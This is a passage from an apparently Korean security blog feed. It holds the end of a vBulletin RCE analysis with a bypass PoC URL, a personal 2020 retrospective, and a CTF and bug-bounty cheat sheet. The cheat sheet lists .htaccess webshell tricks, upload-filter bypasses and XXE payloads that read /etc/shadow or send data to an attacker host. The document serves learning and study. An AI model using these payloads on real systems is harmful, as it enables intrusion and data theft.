class="class"> </span>&#123;</span><br><span class="line">+<span class="comment">//This is intended to allow the runtime to know that template it is rendering.</span></span><br><span class="line">+<span class="comment">//It&#x27;s ugly and shouldn&#x27;t be used lightly, but making some features widely</span></span><br><span class="line">+<span class="comment">//available to all templates is uglier.</span></span><br><span class="line">+<span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$templates</span> = <span class="keyword">array</span>();</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">startTemplate</span>(<span class="params"><span class="variable">$template</span></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+array_push(<span class="built_in">self</span>::<span class="variable">$templates</span>, <span class="variable">$template</span>);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">endTemplate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+array_pop(<span class="built_in">self</span>::<span class="variable">$templates</span>);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">currentTemplate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+<span class="keyword">return</span> end(<span class="built_in">self</span>::<span class="variable">$templates</span>);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$units</span> = <span class="keyword">array</span>(</span><br><span class="line"> <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;px&#x27;</span>,</span><br><span class="line">@@ <span class="number">-1944</span>,<span class="number">6</span> +<span class="number">1964</span>,<span class="number">21</span> @@</span><br><span class="line"> <span class="keyword">return</span> <span class="string">&#x27;&lt;div style=&quot;border:1px solid red;padding:10px;margin:10px;&quot;&gt;&#x27;</span> . htmlspecialchars(<span class="variable">$timerName</span>) . <span class="string">&#x27;: &#x27;</span> . <span class="variable">$elapsed</span> . <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">evalPhp</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+<span class="comment">//only allow the PHP widget template to do this.  This prevents a malicious user</span></span><br><span class="line">+<span class="comment">//from hacking something into a different template.</span></span><br><span class="line">+<span class="keyword">if</span> (<span class="built_in">self</span>::currentTemplate() != <span class="string">&#x27;widget_php&#x27;</span>)</span><br><span class="line">+&#123;</span><br><span class="line">+<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">+&#125;</span><br><span class="line">+ob_start();</span><br><span class="line">+<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">+<span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">+ob_end_clean();</span><br><span class="line">+<span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">+&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><strong>또한 evalPhP 메서드의 현재 템플릿이 widget_php가 아니면 Null을 반환하도록 하는 조건문을 추가해서, 다른 템플릿에서 악용될 요소도 제거하는 것을 볼 수 있습니다. (Line 342 ~ 345)</strong><br></p><p><strong>이와 같이 총 2곳을 패치해서 0-day 취약점을 제거했지만 약 1년 정도가 지나고 한 보안 연구원에 의해서 우회가 돼 0-day가 다시 나오게 되었습니다.</strong><br></p><hr><h2 id="CVE-2020-7373"><a href="#CVE-2020-7373" class="headerlink" title="CVE-2020-7373"></a><em>CVE-2020-7373</em></h2><p><strong><code>CVE-2020-7373</code>은 <code>CVE-2019-16759</code>를 패치한 것을 우회해 다시 RCE 취약점을 트리거 한 0-day 입니다. 해당 취약점은 본례의 익스 방식과 크게 다를 게 없지만 다르다면 템플릿을 <code>widget_php</code>가 아닌 <code>widget_tabbedcontainer_tab_panel</code>이라는 템플릿을 이용해서 익스를 진행하였습니다.</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">name</span>=<span class="string">&quot;widget_tabbedcontainer_tab_panel&quot;</span> <span class="attr">templatetype</span>=<span class="string">&quot;template&quot;</span> <span class="attr">date</span>=<span class="string">&quot;1532130449&quot;</span> <span class="attr">username</span>=<span class="string">&quot;vBulletin&quot;</span> <span class="attr">version</span>=<span class="string">&quot;5.4.4 Alpha 2&quot;</span>&gt;</span>&lt;![CDATA[&#123;vb:set panel_id, &#123;vb:concat &#123;vb:var id_prefix&#125;, &#123;vb:var tab_num&#125;&#125;&#125;</span><br><span class="line">&lt;div id=&quot;&#123;vb:var panel_id&#125;&quot; class=&quot;h-clearfix js-show-on-tabs-create h-hide&quot;&gt;</span><br><span class="line">&lt;vb:comment&gt;</span><br><span class="line">- &#123;vb:var panel_id&#125; </span><br><span class="line">&lt;vb:each from=&quot;subWidgets&quot; value=&quot;subWidget&quot;&gt;</span><br><span class="line">&amp;nbsp;&amp;nbsp;-- &#123;vb:raw subWidget.template&#125;</span><br><span class="line">&lt;/vb:each&gt;</span><br><span class="line">&lt;/vb:comment&gt;</span><br><span class="line"> </span><br><span class="line">&lt;vb:each from=&quot;subWidgets&quot; value=&quot;subWidget&quot;&gt;</span><br><span class="line">&#123;vb:template &#123;vb:raw subWidget.template&#125;, </span><br><span class="line">widgetConfig=&#123;vb:raw subWidget.config&#125;, </span><br><span class="line">widgetinstanceid=&#123;vb:raw subWidget.widgetinstanceid&#125;,</span><br><span class="line">widgettitle=&#123;vb:raw subWidget.title&#125;, </span><br><span class="line">tabbedContainerSubModules=&#123;vb:raw subWidget.tabbedContainerSubModules&#125;,</span><br><span class="line">product=&#123;vb:raw subWidget.product&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/vb:each&gt; </span><br><span class="line">&lt;/div&gt;]]&gt;<span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong><code>widget_tabbedcontainer_tab_panel</code> 템플릿은 자식 템플릿을 생성해주는 템플릿이라고 합니다. 하단의 보면 subWidget.template를 이용해서 템플릿 이름을 정하고, {vb:raw subWidget.config}를 이용해서 widgetConfig에 값을 넣어주는 것을 볼 수 있습니다.</strong><br><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POC : http:&#x2F;&#x2F;141.164.52.207&#x2F;?subWidgets[0][template]&#x3D;widget_php&amp;subWidgets[0][config][code]&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><p><strong>그러니 위와 같이 subWidget.template의 값으로 <code>widget_php</code>, subWidget.config의 값으로 <code>code:phpinfo();</code>로 넘겨주면 template의 값은 <code>widget_php</code>, widgetConfig.code의 값은 <code>phpinfo();</code>가 될 것 이고, widget_php 템플릿이 생성되면 widgetConfig[‘code’]의 값은 <code>phpinfo();</code>이므로 <code>widget_php</code>에서 <code>CVE-2019-16759</code>와 동일하게 RCE가 트리거 되게 됩니다.</strong><br></p><hr><h2 id="CVE-2020-7373-Patch"><a href="#CVE-2020-7373-Patch" class="headerlink" title="CVE-2020-7373 Patch"></a><em>CVE-2020-7373 Patch</em></h2><p><strong>패치 코드가 안 보임</strong><br></p><hr>]]></content>
      
      
      <categories>
          
          <category> 0-day </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> 0-day </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 회고와 2021 계획</title>
      <link href="2021/01/18/2021-01-18-new-year/"/>
      <url>2021/01/18/2021-01-18-new-year/</url>
      
        <content type="html"><![CDATA[<p><strong>페이스북을 들어가보니 티오리에서 회고록을 쓴 것을 읽어보았습니다. 글을 읽고 저도 처음으로 회고록과 앞으로의 계획들을 써봐야겠다고 생각이 들었습니다.</strong></p><hr><h2 id="2020년-회고"><a href="#2020년-회고" class="headerlink" title="2020년 회고"></a>2020년 회고<br></h2><p><span style="color:#21C587">#</span> January ~ March<br></p><p><strong>2020년에는 여태 살아왔던 해를 비교해서 제일 열심히 살았고, 많은 성장을 했던 해인 거 같습니다. 처음에는 솔직히 “내가 이것을 잘 할 수 있을 까?”라는 의심을 가지며 시작했지만 하루 하루가 지나며 다행히도 의심은 사라졌고, 그 의심이 더 힘이 되어준 거 같습니다. 그리고 1월부터 3월까지 통틀어서 제일 다행과 동시에 좋았던 것은 좋은 사람을 만났던 것 입니다. 야미라는 갓님과 첫 약속을 친구와 함께 어느 술집에서 시작해서 지금까지 지내오고, 또 떡볶이좋아라는 형님도 학교 선배인 것을 알게 되어, 학교를 입학하기 전에 만나서 밥을 먹으며 이런 저런 이야기를 나누었습니다. (물론 술집에서) 이렇게 1월부터 3월은 좋은 사람들을 만나며 아주 좋은 시작을 했습니다. </strong><br></p><p><span style="color:#21C587">#</span> April ~ June<br></p><p><strong>그렇게 코로나와 함께 3월까지 개인 공부를 하다가 4월 쯤에 학교를 첫 입학하게 되었습니다. 우리 학교만 이상하게 코로나인데도 4월에 입학을 했다는 거에 매우 불만이였지만, 처음으로 학교를 간 날 기적 같은 일이 일어났습니다. 이날 학교를 마치고 부대찌게 집에서 친구와 Jsec님(학교 선배)과 함께 밥을 먹으면서 이런 저런 이야기를 하며 친해졌고, Jsec님에게 여러가지 질문을 하며 보안 공부를 했었습니다. 그리고 4월인가 비가 올 때 쯤에 Jsec님이 강남 **빌딩에서 강의를 한다고 저보고 와서 들으라고 하셔서 가서 CTF 문제 풀이 강의를 듣게 되었는데, 이때 너무 많은 것들을 배우고, 또 이 날 CTF의 첫 눈을 떠버렸었습니다. 이 날 이후로 CTFTIME을 통해 여러가지 CTF 대회들을 참여하기 시작했었습니다.</strong><br></p><p><span style="color:#21C587">#</span> July ~ September<br></p><p><strong>7월에는 학교 기말고사가 끝나고, 학교를 계속 다닐 지 그만 다닐 지 고민을 잠시 했었습니다. 학교에서 배우면 시간적으로 너무 아깝고, 또 딥하게 배우는 데는 그냥 혼자하는 게 더 좋을 거 같다는 생각이 들어서 결국 자퇴하고, 무작정 취업 준비로 들어갔습니다. 이때 자만감의 취해 회사를 지원하면 어디든 붙겠지~ 라는 생각으로 지원을 했습니다. 그런데 아니나 다를 까 처음 지원한 회사에 바로 붙어 첫 면접을 준비했던 것 입니다. 타이거팀이라는 기업인데 여튼 뭐 면접에서 불합격을 받으며 제 자신의 위치를 다시 확인하는 좋은 경험이였습니다. 그리고 9월에는 김종민멘토님께 연락을 해 대외 활동 관련해서 이야기를 하다가 갓멘토님께서 보안팀 하나를 추천해주셔서 N0Named라는 보안팀의 인턴으로 들어가게 되었습니다.</strong><br></p><p><span style="color:#21C587">#</span> October ~ December<br></p><p><strong>10월, 11월에는 지니온, 시큐어루트라는 회사에 1차 서류를 합격해서 면접을 보게 되었습니다! 과연 결과는….? 광탈! 이때는 정말 면접을 잘 봤다고 생각을 했는데 면접관님께서는 그렇게 안 보이셨나 봅니다. 여튼 이렇게 후반부에 2개의 회사에 불합격을 받아 다시 한 번 충격을 받고, N0Named 보안팀의 인턴 활동을 더 열심히 했었습니다. 하지만 개인적인 집안 사정 때문에 12월에 한 번 더 내부 세미나를 참석하지 못 해 인턴에서 2쿠를 당하고, 집안 일을 도우며 12월을 보냈고, 중간에 또 좋은 분을 만나서 SUA의 운영진으로 들어가 활동하고 있습니다.</strong><br></p><p><span style="color:#21C587">#</span> Bug Bounty<br></p><p><strong>2020년 12월 22일에 해커원이라는 플랫폼에서 특정 사이트를 선정해 버그바운티를 진행했습니다.  이날 정말 운 좋게 Reflected XSS를 발견했습니다! 흑흑 하지만 해당 취약점은 self xss이기 때문에 시나리오를 작성해 공격을 연계해는 게 쉽지 않아 결국 바운티를 받지 못 했습니다. 아닛 로그인 기능도 없어 세션 탈취도 못 하고,, 너무 아쉬웠지만 버그바운티를 하며 처음으로 재미를 느꼈기 때문에 나쁘지는 않았습니다. 아마 바운티를 받았다면 이거 보다 몇 억배는 행복할 거 같았는데 여튼 아쉬웠습니다.</strong><br></p><p><span style="color:#21C587">#</span> CTF<br></p><p><strong>2020년 4월쯤에 Jsec 님의 Pico CTF 강의를 직관으로 보고, 듣고 하면서 첫 CTF의 눈을 뜨게 되었습니다. 이때는 보안을 시작한 지 한 달 정도 됐던 때라서 CTF를 처음 접해보았습니다. 그러다가 CTFTIME이라는 플랫폼을 알게 되었고, 해당 플랫폼을 통해서 CTF 대회를 출전하게 되었습니다. 물론 수상을 하지 못 할 것은 알지만 그래도 여러가지 배경지식을 쌓기 위해서 개인 공부를 하고, CTF를 혼자 참여를 쭉 해오고 있습니다. CTF를 한 3개월 정도 쭉 나가보니 조금씩 배경 지식과 기술들이 쌓이기 시작해서 쉬운 문제들은 20분 안에, 중간 난이도들은 그래도 3시간 안에는 풀리는 거 같습니다. 또 이렇게 CTF를 나가면서 많이 느낀 건데 저는 전에 한 번 봤던 유형이 아니면 매우 어려움을 겪고 문제를 풀지 못 한다는 것을 느꼈습니다. 연구쪽으로 가고 싶은데 이런 부분에서 많이 약하기 때문에 더 많은 노력을 해야 할 거 같습니다. 그리고 요즘들어서는 가끔 사람들과 같이 대회를 나가고 있고, 1년만 더 노력해서 꼭 한국 대회에서 본선 진출만이라도 하려고 노력하고 있습니다.</strong><br></p><p><span style="color:#21C587">#</span> BOB<br></p><p><strong>이번 6월인가 7월쯤에 BOB 서류를 지원했었습니다. 당시에 지원 서류를 작성할 때는 겸손을 100으로 작성을 하였습니다. 정말 아무 것도 모르지만, 이런 이런 생각을 가지고 있고, 보안을 시작하게 된 이유와 앞으로 이러이러하게 할 계획을 가지고 있다는 식으로 작성을 했었습니다. 당시에는 이게 왜 떨어진 지 몰랐지만 지금 생각해보면 너무 겸손했던 것이 제일 문제점이였던 거 같습니다. 물론 자랑할 실력도 아니고, 자랑할 것도 없지만 공부를 한 지 1주일도 안 된 초등학생 느낌으로 글을 작성해버려서.. 여하튼 이번 년도에 회사를 다니지 않고 있다면 지원서를 조금 더 상세히 작성해서 지원을 할 생각입니다.</strong><br></p><hr><h2 id="2021-회고"><a href="#2021-회고" class="headerlink" title="2021 회고"></a>2021 회고<br></h2><p><span style="color:#21C587">#</span> January 1 ~ 18<br></p><p><strong>2021년 1월 7일에는 재검을 받고, 사회 복무 요원을 받아버렸습니다~ 제일 잘 한 일~ 이렇게 재검을 받고, 사회 복무 요원을 뽑는 모의해킹 회사를 찾아 지원을 했습니다. 운 좋게 한 시큐리티라는 회사에 1차 서류 합격을 받았고, 현재는 면접 날짜를 다시 정해준다고 기다리고 있는 상태입니다. 그리고 또 오펜시브 시큐리티인 디펜스라는 보안 기업에도 서류를 넣었는데,,, 운 좋게 여기도 서류가 붙어버렸습니다. 오펜시브 시큐리티를 가고 싶었는데 이렇게 디펜스라는 기업에 서류를 붙게 돼 좋은 기회를 얻었고, 면접은 1월 21일에 보기로 했습니다. 하지만 해당 기업은 사회 복무 요원으로 채용을 하고 있지 않기 때문에 해당 기업을 나오게 되면 다시 사회 복무 요원을 채용하는 회사로 가야 해서 조금 고민이긴 합니다만 하임시큐리티라는 기업도 병특을 진행하고 있어 디펜스에서 실력을 많이 늘린다면 추 후에 사복요를 하임에서 할 수 있지 않을 까?라는 생각으로 디펜스를 노려보기로 했습니다.</strong><br></p><p><span style="color:#21C587">#</span> Diffense nterview<br></p><p><strong>2021년 1월 21일에 오펜시브 시큐리티인 디펜스에서 면접을 보았습니다. 보안 공부를 하면서 면접을 몇 곳 봐왔지만 이번 면접을 통해서는 매우 많은 것을 느낀 면접이였습니다. 앞 전에 본 면접들은 신입을 뽑아서인 지 면접 난이도도 많이 쉬웠는데, 디펜스 연구원 면접은 평소에 생각해 보지 못 했던 질문들을 받아 많이 당황하였습니다. 하지만 해당 면접은 제가 평소에 늘 원하던 면접 중 하나였습니다. 학벌을 보지 않고, 오로지 내가 무엇을 했고, 어떤 것들을 제보 했으며, 만약 제보를 못 했다면 왜 못 했는 지? 또한 자기가 공부하는 분야에서는 몇 등 안에 드는 지?와 같은 질문들을 받았습니다. 이런 질문에 답을 하는 저를 보며 아직 매우 부족하다는 것을 깨닫았습니다. 앞 전에 본 면접들은 모두 내가 학사, 군대 문제 때문에 떨어졌겠지 라는 생각이 들 정도로 면접 퀄이 좋지 않았는데, 이번에는 개인적으로 면접이 너무 좋았던 거 같습니다. 1년 동안 공부를 더 열심히 해서 내년에 디펜스에 꼭 들어갈 멋진 분들과 함께 연구를 하며 성장할 수 있도록 할 계획입니다. 이번 기회로 처음으로 하나의 기업을 목표로 다시 공부하게 되어 매우 좋습니다. 아 그리고 앞 전에는 모두 면접을 보면서 자기 소개 하라는 거 자체가 이해가 안 갔는데 정말 스타트 업 중에서 좋은 회사는 자기 소개 따윈하지 않는 거 같습니다 ^-^ 물론 다른 기업은 면접을 보지 않아 쓸데 없는 자소를 하는 곳도 많겠지만요.</strong><br></p><hr><h2 id="2021-계획"><a href="#2021-계획" class="headerlink" title="2021 계획"></a>2021 계획<br></h2><p><strong>이제 남은 2021년을 어떻게 이용하냐… 저는 CVE ID 획득, CTF 본선 진출을 목표로 지금보다 더 열심히 공부하며 달려나가 보려고 합니다. 2020년도 많이 뿌듯했지만 2021년은 2020년보다 더 뿌듯한 해가 돼야 하기 때문에 더 빡세게 구르며 살아보려고 합니다. 결론은 공익 공익 공익 만만세!</strong><br></p><hr>]]></content>
      
      
      <categories>
          
          <category> NewYear </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NewYear </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Note</title>
      <link href="2021/01/15/2021-01-15-note/"/>
      <url>2021/01/15/2021-01-15-note/</url>
      
        <content type="html"><![CDATA[<p><strong>워게임, CTF 및 버그바운티를 하다 보면 생각 외로 필요한 것들이 많습니다. 하지만 그 많은 것들을 항상 기억하고 있기는 힘들다는 것을 알고 있기 때문에 앞으로 하나 하나 중요한 페이로드들을 정리를 해나갈 것 이고, 이번 글의 가독성은 저의 기준으로 작성하겠습니다.</strong></p><hr><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess<br></h2><p><span style="color:#21C587">&#35;</span><strong>PHP 엔진을 끄고, PHP 소스 코드를 확인해야 할 경우</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag engine off</span><br></pre></td></tr></table></figure><p><strong>위와 같이 .htaccess 파일을 업로드 해주면 PHP 코드가 실행이 되지 않고, PHP 코드 자체가 출력이 됩니다.</strong><br><br></p><p><span style="color:#21C587">&#35;</span><strong>php 확장자를 다른 문자열로 변경할 경우</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .burp</span><br></pre></td></tr></table></figure><p><strong>위와 같이 .htaccess 파일을 업로드 하게 되면 burp라는 확장자로 업로드 해도 PHP 코드가 실행됩니다. </strong><br><br></p><p><span style="color:#21C587">&#35;</span><strong>.htaccess 파일 자체를 Webshell로 업로드 할 경우</strong><br><br><span style="color:#21C587">&#35;</span><strong>.htaccess 파일을 업로드 가능하지만 <code>&lt;?php</code>, <code>&lt;?</code>와 같은 문자열을 필터링 할 경우</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">#+ADw?php phpinfo()+ADs</span><br></pre></td></tr></table></figure><p><strong>위와 같이 .htaccess 파일을 업로드 할 경우 .htaccess 파일 자체로 Webshell로 사용할 수 있습니다.</strong><br><br></p><p><span style="color:#21C587">&#35;</span><strong>exif_imagetype&#40;&#41; 함수를 이용해 이미지 타입을 검증하는 경우</strong><br><br><span style="color:#21C587">&#35;</span><strong>이미지 사이즈를 검증하는 경우</strong><br><br><span style="color:#21C587">&#35;</span><strong><code>&lt;?</code>, <code>&lt;?php</code>와 같은 문자열을 필터링하는 경우</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define test_width 1337</span><br><span class="line">#define test_height 1337</span><br><span class="line">AddType application&#x2F;x-httpd-php .burp</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table></figure><p><strong>위와 같이 .htaccess 파일을 업로드 하면 xbm 파일로 인식을 하기 때문에 exif_imagetype&#40;&#41; 함수에 걸리지 않고, .htaccess 파일을 업로드 할 수 있습니다. 위 파일을 업로드 하고, burp라는 확장자로 Payload를 UTF-7로 인코딩해서 업로드 하면 Webshell 사용이 가능합니다.</strong><br><br></p><p><strong>당연히 Payload를 업로드 할 때도, exif_imagetype&#40;&#41; 함수에 걸리지 않게 하기 위해 <code>#define~</code> 문을 적어줘야 합니다.</strong><br><br></p><hr><h2 id="Upload-Function"><a href="#Upload-Function" class="headerlink" title="Upload Function"></a>Upload Function<br></h2><p><span style="color:#21C587">&#35;</span><strong> Blacklisting Bypass</strong><br></p><ul><li>PHP → <code>.php</code>, <code>.phtm</code>, <code>phtml</code>, <code>.phps</code>, <code>.pht</code>, <code>.php2</code>, <code>.php3</code>, <code>.php4</code>, <code>.php5</code>, <code>.shtml</code>, <code>.pahr</code>, <code>.pgif</code>, <code>.inc</code><br></li><li>ASP → <code>.asp</code>, <code>.aspx</code>, <code>.cer</code>, <code>.asa</code><br></li><li>JSP → <code>.jsp</code>, <code>.jspx</code>, <code>.jsw</code>, <code>.jsv</code>, <code>jspf</code><br></li></ul><p><span style="color:#21C587">&#35;</span><strong> Whitelisting Bypass</strong><br></p><ul><li>file.jpg.php</li><li>file.php.jpg</li><li>file.php.blah123jpg</li><li>file.php%00.jpt</li><li>file.php\x00.jpt</li><li>file.php%00</li><li>file.php%20</li><li>file.php%0d%0a.jpg</li><li>file.php/</li><li>file.php.\</li></ul><hr><h2 id="XXE-Original"><a href="#XXE-Original" class="headerlink" title="XXE (Original)"></a>XXE (Original)<br></h2><p><span style="color:#21C587">&#35;</span><strong> XXE Original</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">burp</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">burp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/shadow&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lfi</span>&gt;</span><span class="symbol">&amp;burp;</span><span class="tag">&lt;/<span class="name">lfi</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE to SSRF</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">burp</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">burp</span> <span class="meta-keyword">system</span> <span class="meta-string">&quot;domain&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ssrf</span>&gt;</span><span class="symbol">&amp;burp;</span><span class="tag">&lt;/<span class="name">ssrf</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE (XInclude attacks)</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">burp</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span> <span class="attr">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">burp</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE (php wrapper)</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">burp</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">burp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=****&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lfi</span>&gt;</span><span class="symbol">&amp;burp;</span><span class="tag">&lt;/<span class="name">lfi</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="XXE-feat-svg"><a href="#XXE-feat-svg" class="headerlink" title="XXE (feat svg)"></a>XXE (feat svg)<br></h2><p><span style="color:#21C587">&#35;</span><strong> XXE</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/issue&quot;</span> &gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">font-size</span>=<span class="string">&quot;40&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;15&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span>                    </span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Blind XXE &amp; SSRF</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no”?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ENTY</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">XXE</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/issue”&gt; ]&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;svg xmlns:svg=”http://www.w3.org/2000/svg&quot;</span> <span class="meta-keyword">xmlns</span>=”http://www.w3.org/2000/svg<span class="meta-string">&quot; xmlns:xlink=&quot;</span>http://www.w3.org/1999/xlink<span class="meta-string">&quot; width=&quot;</span>200<span class="meta-string">&quot; height=”200&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">&lt;image xlink:href=&quot;http://EVILHOST:1337/SSRF?&amp;XXE;&quot; /&gt;</span></span><br><span class="line"><span class="meta">&lt;/svg&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE &amp; XSS</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.1&quot; standlone=&quot;no&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">svg</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD SVG 1.1//EN&quot;</span> <span 